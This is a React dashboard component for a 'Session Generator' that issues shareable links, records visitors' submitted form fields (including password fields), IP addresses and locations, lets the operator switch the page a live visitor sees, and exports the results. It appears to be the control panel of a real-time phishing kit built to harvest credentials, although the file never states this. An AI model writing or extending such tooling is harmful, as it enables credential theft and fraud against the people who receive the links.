
import React, { useEffect, useState } from 'react';
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { ScrollArea, ScrollBar } from "@/components/ui/scroll-area";
import { toast } from '@/hooks/use-toast';
import { LinkIcon, Copy, Download, X, Plus, Bell, Eye } from 'lucide-react';
import { useSessionContext } from '@/contexts/SessionContext';
import { useNavigate } from 'react-router-dom';
import { cn } from '@/lib/utils';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";

const Dashboard = () => {
  const { 
    sessions, 
    mainPages,
    switchSubPage, 
    exportSessionData, 
    closeSession,
    getMainPageById,
    getSubPageById,
    resetNewDataFlag 
  } = useSessionContext();
  const navigate = useNavigate();
  const [viewingSessionData, setViewingSessionData] = useState<{ 
    sessionId: string, 
    data: Array<{ 
      timestamp: string; 
      ip: string; 
      location: string; 
      formData: Record<string, string>; 
    }> 
  } | null>(null);
  
  const getPageTypeName = (mainPageId: string, subPageId: string) => {
    const mainPage = getMainPageById(mainPageId);
    const subPage = mainPage ? mainPage.subPages.find(sp => sp.id === subPageId) : undefined;
    
    return {
      mainName: mainPage?.name || 'Unknown',
      subName: subPage?.name || 'Unknown'
    };
  };
  
  const handleCopyLink = (link: string) => {
    navigator.clipboard.writeText(link);
    toast({
      title: "Link Copied",
      description: "Session link has been copied to clipboard."
    });
  };
  
  const handleSwitchSubPage = (sessionId: string, newSubPageId: string) => {
    const session = sessions.find(s => s.id === sessionId);
    if (!session) return;
    
    const { mainName, subName } = getPageTypeName(
      session.mainPageId, 
      newSubPageId
    );
    
    switchSubPage(sessionId, newSubPageId);
    toast({
      title: "Page Type Changed",
      description: `Session page has been updated to ${subName}.`
    });
  };
  
  const handleCloseSession = (sessionId: string) => {
    closeSession(sessionId);
    toast({
      title: "Session Closed",
      description: `Session ${sessionId} has been closed.`
    });
  };

  const viewSessionData = (sessionId: string) => {
    const session = sessions.find(s => s.id === sessionId);
    if (session) {
      setViewingSessionData({
        sessionId: session.id,
        data: session.data
      });
    }
  };

  const formatDate = (dateString: string) => {
    const date = new Date(dateString);
    return new Intl.DateTimeFormat('en-US', {
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    }).format(date);
  };

  // Reset the new data flag to stop the animation when the user has seen it
  useEffect(() => {
    const timeouts: NodeJS.Timeout[] = [];
    
    sessions.forEach(session => {
      if (session.hasNewData) {
        const timeout = setTimeout(() => {
          resetNewDataFlag(session.id);
        }, 5000); // Reset after 5 seconds
        timeouts.push(timeout);
      }
    });
    
    return () => {
      timeouts.forEach(timeout => clearTimeout(timeout));
    };
  }, [sessions, resetNewDataFlag]);

  return (
    <div className="container mx-auto animate-fade-in">
      <div className="flex flex-col md:flex-row md:justify-between md:items-center gap-4 mb-8">
        <div>
          <h1 className="text-3xl font-bold">Session Generator</h1>
          <p className="text-muted-foreground">Create and manage your session links</p>
        </div>
        <div className="flex">
          <Button onClick={() => navigate('/create-session')}>
            <Plus className="h-4 w-4 mr-2" /> Create Session
          </Button>
        </div>
      </div>
      
      <div className="mb-8">
        <h2 className="text-xl font-semibold mb-4">Current Sessions</h2>
        {sessions.length === 0 ? (
          <div className="bg-card rounded-lg p-8 text-center border">
            <div className="mb-4 text-muted-foreground">
              <LinkIcon className="h-12 w-12 mx-auto" />
            </div>
            <h3 className="text-lg font-medium mb-2">No active sessions</h3>
            <p className="text-muted-foreground mb-4">Create your first session to get started</p>
            <Button onClick={() => navigate('/create-session')}>Create Session</Button>
          </div>
        ) : (
          <ScrollArea className="w-full whitespace-nowrap rounded-md border">
            <div className="flex p-4 gap-4">
              {sessions.map((session) => {
                const { mainName, subName } = getPageTypeName(
                  session.mainPageId, 
                  session.currentSubPageId
                );
                const mainPage = getMainPageById(session.mainPageId);
                const currentSubPage = mainPage?.subPages.find(
                  sp => sp.id === session.currentSubPageId
                );
                
                return (
                  <Card 
                    key={session.id} 
                    className={cn(
                      "session-card min-w-[300px] max-w-[350px]",
                      session.hasNewData && "animate-pulse border-primary"
                    )}
                  >
                    <CardHeader className="pb-3 relative">
                      <Button 
                        variant="ghost" 
                        size="icon" 
                        className="absolute top-2 right-2" 
                        onClick={() => handleCloseSession(session.id)}
                      >
                        <X className="h-4 w-4" />
                      </Button>
                      <div className="pr-6 flex items-center justify-between">
                        <CardTitle className="text-lg">Session: {session.id}</CardTitle>
                        {session.hasNewData && (
                          <Bell className="h-4 w-4 text-primary animate-pulse" />
                        )}
                      </div>
                      <div className="mt-1">
                        <Badge className="mr-2 bg-brand-purple">{mainName}</Badge>
                        <Badge variant="outline">{subName}</Badge>
                      </div>
                      <div className="mt-2 text-sm text-muted-foreground truncate">
                        <a 
                          href={`${window.location.origin}/page/${session.id}`} 
                          target="_blank" 
                          rel="noopener noreferrer"
                          className="hover:underline"
                        >
                          {`${window.location.origin}/page/${session.id}`}
                        </a>
                      </div>
                    </CardHeader>
                    <CardContent className="pb-3">
                      <div className="flex items-center justify-between">
                        <div>
                          <div className="text-sm font-medium">Data captured:</div>
                          <div className="mt-1">
                            <Badge variant="outline">
                              {session.data.length} {session.data.length === 1 ? 'entry' : 'entries'}
                            </Badge>
                          </div>
                        </div>
                        <div>
                          <div className="text-sm font-medium">Sub Page:</div>
                          <div className="mt-1">
                            <Select 
                              value={session.currentSubPageId} 
                              onValueChange={(value) => handleSwitchSubPage(session.id, value)}
                            >
                              <SelectTrigger className="w-[130px] h-8 text-xs">
                                <SelectValue />
                              </SelectTrigger>
                              <SelectContent>
                                {mainPage?.subPages.map((subPage) => (
                                  <SelectItem key={subPage.id} value={subPage.id}>
                                    {subPage.name}
                                  </SelectItem>
                                ))}
                              </SelectContent>
                            </Select>
                          </div>
                        </div>
                      </div>
                    </CardContent>
                    <CardFooter className="pt-2 flex justify-between">
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => viewSessionData(session.id)}
                      >
                        <Eye className="h-4 w-4 mr-2" /> View Data
                      </Button>
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => exportSessionData(session.id)}
                        disabled={session.data.length === 0}
                      >
                        <Download className="h-4 w-4 mr-2" /> Export
                      </Button>
                    </CardFooter>
                  </Card>
                );
              })}
            </div>
            <ScrollBar orientation="horizontal" />
          </ScrollArea>
        )}
      </div>
      
      <div className="bg-card rounded-lg p-6 border">
        <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
          <div>
            <h3 className="text-lg font-medium">Session Quick Guide</h3>
            <p className="text-muted-foreground max-w-2xl">
              Create a session, share the generated link, and collect data. You can change the sub-page at any time
              and the live session will update instantly. Export data when you're ready.
            </p>
          </div>
          <Button variant="outline" className="shrink-0" onClick={() => navigate('/create-session')}>
            <Plus className="h-4 w-4 mr-2" /> Create New Session
          </Button>
        </div>
      </div>

      {/* Data Viewing Dialog */}
      <Dialog open={!!viewingSessionData} onOpenChange={() => setViewingSessionData(null)}>
        <DialogContent className="max-w-3xl max-h-[80vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle>Session Data: {viewingSessionData?.sessionId}</DialogTitle>
          </DialogHeader>
          {viewingSessionData?.data.length === 0 ? (
            <div className="text-center py-8">
              <p>No data has been captured for this session yet.</p>
            </div>
          ) : (
            <div className="space-y-6">
              {viewingSessionData?.data.map((entry, index) => (
                <Card key={index} className="border">
                  <CardHeader className="pb-2">
                    <div className="flex justify-between items-center">
                      <div className="text-sm text-muted-foreground">
                        Entry #{index + 1} • {formatDate(entry.timestamp)}
                      </div>
                      <Badge variant="outline" className="text-xs">
                        {entry.location}
                      </Badge>
                    </div>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-2">
                      {Object.entries(entry.formData).map(([key, value]) => (
                        <div key={key} className="grid grid-cols-12 gap-2">
                          <div className="col-span-4 font-medium text-sm">{key}:</div>
                          <div className="col-span-8 text-sm">
                            {key.includes('password') ? '••••••••' : value}
                          </div>
                        </div>
                      ))}
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default Dashboard;
